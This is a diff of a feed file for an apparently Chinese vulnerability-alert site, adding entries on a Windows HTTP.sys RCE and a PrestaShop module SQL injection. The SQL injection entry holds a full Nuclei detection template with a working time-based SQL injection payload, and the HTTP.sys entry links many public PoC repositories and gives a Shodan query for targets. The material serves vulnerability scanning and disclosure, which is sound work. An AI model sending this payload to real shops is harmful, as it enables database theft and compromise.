@@ -4,6 +4,114 @@
   
   
   <entry>
+    <title>HTTP Protocol Stack 远程代码执行漏洞</title>
+    <link href="/2025/06/10/github_1320469250/"/>
+    <url>/2025/06/10/github_1320469250/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> HTTP Protocol Stack 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2022-21907</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> HTTP Protocol Stack 中存在一个远程代码执行漏洞，该漏洞由于协议处理不当导致，允许远程攻击者在受影响的系统上执行任意代码。利用此漏洞需要网络访问受影响系统。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> HTTP Protocol Stack</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:o:microsoft:windows_10”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12263">https://github.com/projectdiscovery/nuclei-templates/issues/12263</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>The HTTP Protocol Stack contains a remote code execution caused by a vulnerability in the protocol handling, letting remote attackers execute arbitrary code, exploit requires network access to the affected system.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://github.com/kamal-marouane/CVE-2022-21907">https://github.com/kamal-marouane/CVE-2022-21907</a></li><li><a href="https://vulncheck.com/xdb/8d7c3f5c3e4c">https://vulncheck.com/xdb/8d7c3f5c3e4c</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:kamal-marouane&#x2F;CVE-2022-21907.git</li><li><a href="https://github.com/asepsaepdin/CVE-2022-21907">https://github.com/asepsaepdin/CVE-2022-21907</a></li><li><a href="https://vulncheck.com/xdb/d5f3de9489d0">https://vulncheck.com/xdb/d5f3de9489d0</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:asepsaepdin&#x2F;CVE-2022-21907.git</li><li><a href="https://github.com/EzoomE/CVE-2022-21907-RCE">https://github.com/EzoomE/CVE-2022-21907-RCE</a></li><li><a href="https://vulncheck.com/xdb/9e5b11d4061d">https://vulncheck.com/xdb/9e5b11d4061d</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:EzoomE&#x2F;CVE-2022-21907-RCE.git</li><li><a href="https://github.com/cassie0206/CVE-2022-21907">https://github.com/cassie0206/CVE-2022-21907</a></li><li><a href="https://github.com/0xmaximus/Home-Demolisher">https://github.com/0xmaximus/Home-Demolisher</a></li><li><a href="https://vulncheck.com/xdb/167adf17e68c">https://vulncheck.com/xdb/167adf17e68c</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:0xmaximus&#x2F;Home-Demolisher.git</li><li><a href="https://github.com/Malwareman007/CVE-2022-21907">https://github.com/Malwareman007/CVE-2022-21907</a></li><li><a href="https://vulncheck.com/xdb/2590a1a4a8ef">https://vulncheck.com/xdb/2590a1a4a8ef</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:Malwareman007&#x2F;CVE-2022-21907.git</li><li><a href="https://vulncheck.com/xdb/65a99dd97dd6">https://vulncheck.com/xdb/65a99dd97dd6</a></li><li>https&#x2F;&#x2F;&#x2F;gitee.com:lutixiaya&#x2F;cve-2022-21907.git</li><li><a href="https://github.com/iveresk/cve-2022-21907">https://github.com/iveresk/cve-2022-21907</a></li><li><a href="https://github.com/iveresk/cve-2022-21907-http.sys">https://github.com/iveresk/cve-2022-21907-http.sys</a></li><li><a href="https://github.com/gpiechnik2/nmap-CVE-2022-21907">https://github.com/gpiechnik2/nmap-CVE-2022-21907</a></li><li><a href="https://github.com/polakow/CVE-2022-21907">https://github.com/polakow/CVE-2022-21907</a></li><li><a href="https://vulncheck.com/xdb/86fb978ad867">https://vulncheck.com/xdb/86fb978ad867</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:polakow&#x2F;CVE-2022-21907.git</li><li><a href="https://github.com/michelep/CVE-2022-21907-Vulnerability-PoC">https://github.com/michelep/CVE-2022-21907-Vulnerability-PoC</a></li><li><a href="https://vulncheck.com/xdb/8444bab2f56f">https://vulncheck.com/xdb/8444bab2f56f</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:michelep&#x2F;CVE-2022-21907-Vulnerability-PoC.git</li><li><a href="https://vulncheck.com/xdb/837d27449c0a">https://vulncheck.com/xdb/837d27449c0a</a></li><li>https&#x2F;&#x2F;&#x2F;gitlab.com:swarupsro&#x2F;CVE-2022-21907.git</li><li><a href="https://github.com/p0dalirius/CVE-2022-21907-http.sys">https://github.com/p0dalirius/CVE-2022-21907-http.sys</a></li><li><a href="https://vulncheck.com/xdb/f31e1149e743">https://vulncheck.com/xdb/f31e1149e743</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:p0dalirius&#x2F;CVE-2022-21907-http.sys.git</li><li><a href="https://github.com/xiska62314/CVE-2022-21907">https://github.com/xiska62314/CVE-2022-21907</a></li><li><a href="https://github.com/ZZ-SOCMAP/CVE-2022-21907">https://github.com/ZZ-SOCMAP/CVE-2022-21907</a></li><li><a href="https://vulncheck.com/xdb/1306e5fc35fb">https://vulncheck.com/xdb/1306e5fc35fb</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:ZZ-SOCMAP&#x2F;CVE-2022-21907.git</li><li><a href="https://github.com/mauricelambert/CVE-2022-21907">https://github.com/mauricelambert/CVE-2022-21907</a></li><li><a href="https://github.com/corelight/cve-2022-21907">https://github.com/corelight/cve-2022-21907</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-cpe-cpe-2-3-o-microsoft-windows-10"><a href="#Shodan-Query-cpe-cpe-2-3-o-microsoft-windows-10" class="headerlink" title="Shodan Query: cpe:&quot;cpe:2.3:o:microsoft:windows_10&quot;"></a>Shodan Query: <code>cpe:&quot;cpe:2.3:o:microsoft:windows_10&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>projectdiscovery/nuclei-templates:github issues</tag>
+      
+      <tag>命令执行</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>PrestaShop &#39;possearchproducts&#39; SQL注入漏洞</title>
+    <link href="/2025/06/10/github_3801000954/"/>
+    <url>/2025/06/10/github_3801000954/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> PrestaShop ‘possearchproducts’ SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-30192</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 在PosThemes为PrestaShop开发的模块“Search Products”（possearchproducts）中，受影响版本的访客可以执行SQL注入攻击。成功利用此漏洞可能导致未经授权的访问、数据泄露以及PrestaShop应用及其底层数据库的潜在危害。</p><p><strong>产品厂商：</strong> PosThemes</p><p><strong>产品名称：</strong> Search Products (possearchproducts)</p><p><strong>影响版本：</strong> &lt;&#x3D; 1.7</p><p><strong>搜索语法：</strong> http.component:”prestashop”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/c611e9bf0ec12497ca2e0a23e49cd0a5d583884c/http%2Fcves%2F2023%2FCVE-2023-30192.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/c611e9bf0ec12497ca2e0a23e49cd0a5d583884c/http%2Fcves%2F2023%2FCVE-2023-30192.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>3-<span class="hljs-number">30192</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> PrestaShop &#x27;possearchproducts&#x27; <span class="hljs-operator">&lt;=</span> <span class="hljs-number">1.7</span> <span class="hljs-operator">-</span> SQL Injection<br>  <span class="hljs-params">author:</span> mastercho<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    In the module “Search Products” (possearchproducts) from PosThemes for PrestaShop, a guest can perform SQL injection <span class="hljs-keyword">in</span> affected versions.<br>  <span class="hljs-params">impact:</span> |<br>    Successful exploitation of this vulnerability can lead to unauthorized access, data leakage, and potential compromise of the PrestaShop application and its underlying database.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2023-30192</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//security.friendsofpresta.org/modules/2023/05/11/possearchproducts.html</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>3-<span class="hljs-number">30192</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">89</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.04505</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.92462</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>    <span class="hljs-params">product:</span> possearchproducts<br>    <span class="hljs-params">framework:</span> prestashop<br>    <span class="hljs-params">shodan-query:</span> http.component:<span class="hljs-string">&quot;prestashop&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2023,prestashop,sqli,time-based-sqli<br><br><span class="hljs-params">flow:</span> http(<span class="hljs-number">1</span>) <span class="hljs-operator">&amp;&amp;</span> http(<span class="hljs-number">2</span>)<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">host-redirects:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;contains_any(tolower(response), <span class="hljs-string">&quot;prestashop&quot;</span>, <span class="hljs-string">&quot;possearchproducts&quot;</span>)&#x27;<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        @<span class="hljs-params">timeout:</span> <span class="hljs-number">20</span>s<br>        POST <span class="hljs-symbol">/modules/possearchproducts/SearchProducts.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">id_category</span><span class="hljs-operator">=</span><span class="hljs-number">10</span><span class="hljs-operator">*</span><span class="hljs-keyword">if</span>(now()<span class="hljs-operator">=</span>sysdate()%<span class="hljs-number">2</span>Csleep(<span class="hljs-number">6</span>)%<span class="hljs-number">2</span>C0)&amp;id_lang<span class="hljs-operator">=</span><span class="hljs-number">3</span>&amp;resultsPerPage<span class="hljs-operator">=</span><span class="hljs-number">10</span>&amp;s<span class="hljs-operator">=</span>the<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;duration<span class="hljs-operator">&gt;=</span><span class="hljs-number">6</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains(tolower(response), <span class="hljs-string">&quot;products&quot;</span>)&#x27;<br>          <span class="hljs-operator">-</span> &#x27;status_code <span class="hljs-operator">!=</span> <span class="hljs-number">404</span>&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>projectdiscovery/nuclei-templates:github issues</tag>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>KAFKA CLIENT 390 及以下版本存在服务器端请求伪造漏洞</title>
+    <link href="/2025/06/10/weixin_4128578450/"/>
+    <url>/2025/06/10/weixin_4128578450/</url>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/MB6rac9PQQMMT_gsXafp5Q">https://mp.weixin.qq.com/s/MB6rac9PQQMMT_gsXafp5Q</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>微信公众号</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>mp.weixin.qq.com</tag>
+      
+      <tag>独眼情报</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>16 个下载量达数百万的 React Native 包一夜之间被攻陷</title>
+    <link href="/2025/06/10/weixin_3694287442/"/>
+    <url>/2025/06/10/weixin_3694287442/</url>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 独眼情报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/4LJY9vrwnir39MD3huWN8A">https://mp.weixin.qq.com/s/4LJY9vrwnir39MD3huWN8A</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>微信公众号</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>mp.weixin.qq.com</tag>
+      
+      <tag>独眼情报</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>PrestaShop possearchproducts SQL注入漏洞</title>
     <link href="/2025/06/10/github_1377893591/"/>
     <url>/2025/06/10/github_1377893591/</url>
@@ -3618,33 +3726,6 @@
   
   
   <entry>
-    <title>HTTP Protocol Stack Remote Code Execution Vulnerability</title>
-    <link href="/2025/06/06/github_1320469250/"/>
-    <url>/2025/06/06/github_1320469250/</url>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> HTTP Protocol Stack Remote Code Execution Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2022-21907</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> HTTP协议栈中存在一个远程代码执行漏洞，由于协议处理不当导致，允许远程攻击者在受影响的系统上执行任意代码，利用此漏洞需要网络访问受影响系统。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> HTTP Protocol Stack</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:o:microsoft:windows_10”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12263">https://github.com/projectdiscovery/nuclei-templates/issues/12263</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><br><span class="hljs-comment">### Description: </span><br>&gt; The HTTP Protocol Stack contains a remote code execution caused by a vulnerability <span class="hljs-keyword">in</span> the protocol handling, letting remote attackers execute arbitrary code, exploit requires network access to the affected system.<br><br><span class="hljs-comment">#### Severity: \`Critical\`</span><br><br><span class="hljs-comment">#### POC: </span><br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/kamal-marouane/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span><br>- https:<span class="hljs-regexp">//</span>vulncheck.com<span class="hljs-regexp">/xdb/</span><span class="hljs-number">8</span>d7c3f5c3e4c<br>- https<span class="hljs-regexp">//</span><span class="hljs-regexp">/github.com:kamal-marouane/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span>.git<br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/asepsaepdin/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span><br>- https:<span class="hljs-regexp">//</span>vulncheck.com<span class="hljs-regexp">/xdb/</span>d5f3de9489d0<br>- https<span class="hljs-regexp">//</span><span class="hljs-regexp">/github.com:asepsaepdin/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span>.git<br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/EzoomE/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span>-RCE<br>- https:<span class="hljs-regexp">//</span>vulncheck.com<span class="hljs-regexp">/xdb/</span><span class="hljs-number">9</span>e5b11d4061d<br>- https<span class="hljs-regexp">//</span><span class="hljs-regexp">/github.com:EzoomE/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span>-RCE.git<br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/cassie0206/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span><br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/0xmaximus/</span>Home-Demolisher<br>- https:<span class="hljs-regexp">//</span>vulncheck.com<span class="hljs-regexp">/xdb/</span><span class="hljs-number">167</span>adf17e68c<br>- https<span class="hljs-regexp">//</span><span class="hljs-regexp">/github.com:0xmaximus/</span>Home-Demolisher.git<br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Malwareman007/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span><br>- https:<span class="hljs-regexp">//</span>vulncheck.com<span class="hljs-regexp">/xdb/</span><span class="hljs-number">2590</span>a1a4a8ef<br>- https<span class="hljs-regexp">//</span><span class="hljs-regexp">/github.com:Malwareman007/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span>.git<br>- https:<span class="hljs-regexp">//</span>vulncheck.com<span class="hljs-regexp">/xdb/</span><span class="hljs-number">65</span>a99dd97dd6<br>- https<span class="hljs-regexp">//</span><span class="hljs-regexp">/gitee.com:lutixiaya/</span>cve-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span>.git<br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/iveresk/</span>cve-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span><br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/iveresk/</span>cve-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span>-http.sys<br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/gpiechnik2/</span>nmap-CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span><br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/polakow/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span><br>- https:<span class="hljs-regexp">//</span>vulncheck.com<span class="hljs-regexp">/xdb/</span><span class="hljs-number">86</span>fb978ad867<br>- https<span class="hljs-regexp">//</span><span class="hljs-regexp">/github.com:polakow/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span>.git<br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/michelep/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span>-Vulnerability-PoC<br>- https:<span class="hljs-regexp">//</span>vulncheck.com<span class="hljs-regexp">/xdb/</span><span class="hljs-number">8444</span>bab2f56f<br>- https<span class="hljs-regexp">//</span><span class="hljs-regexp">/github.com:michelep/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span>-Vulnerability-PoC.git<br>- https:<span class="hljs-regexp">//</span>vulncheck.com<span class="hljs-regexp">/xdb/</span><span class="hljs-number">837</span>d27449c0a<br>- https<span class="hljs-regexp">//</span><span class="hljs-regexp">/gitlab.com:swarupsro/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span>.git<br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/p0dalirius/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span>-http.sys<br>- https:<span class="hljs-regexp">//</span>vulncheck.com<span class="hljs-regexp">/xdb/</span>f31e1149e743<br>- https<span class="hljs-regexp">//</span><span class="hljs-regexp">/github.com:p0dalirius/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span>-http.sys.git<br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/xiska62314/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span><br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ZZ-SOCMAP/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span><br>- https:<span class="hljs-regexp">//</span>vulncheck.com<span class="hljs-regexp">/xdb/</span><span class="hljs-number">1306</span>e5fc35fb<br>- https<span class="hljs-regexp">//</span><span class="hljs-regexp">/github.com:ZZ-SOCMAP/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span>.git<br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mauricelambert/</span>CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span><br>- https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/corelight/</span>cve-<span class="hljs-number">2022</span>-<span class="hljs-number">21907</span><br><br><span class="hljs-comment">### KEV: True</span><br><br><span class="hljs-comment">### Shodan Query: \`cpe:&quot;cpe:2.3:o:microsoft:windows_10&quot;\`</span><br><br>&gt; Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(\`-debug\`) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. <br><br>&gt; Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates <span class="hljs-keyword">for</span> CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.<br><br>You can check the FAQ <span class="hljs-keyword">for</span> the Nuclei Templates Community Rewards Program [here](https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/projectdiscovery/</span>nuclei-templates<span class="hljs-regexp">/blob/m</span>ain/Community-Rewards-FAQ.md).<br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-    <categories>
-      
-      <category>Github Poc</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>projectdiscovery/nuclei-templates:github issues</tag>
-      
-      <tag>命令执行</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>欢迎报名｜安恒信息4项命题入围2025中国国际大学生创新大赛产业赛道</title>
     <link href="/2025/06/06/weixin_378624682/"/>
     <url>/2025/06/06/weixin_378624682/</url>
@@ -3823,9 +3904,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>反序列化</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -6438,9 +6519,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>反序列化</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
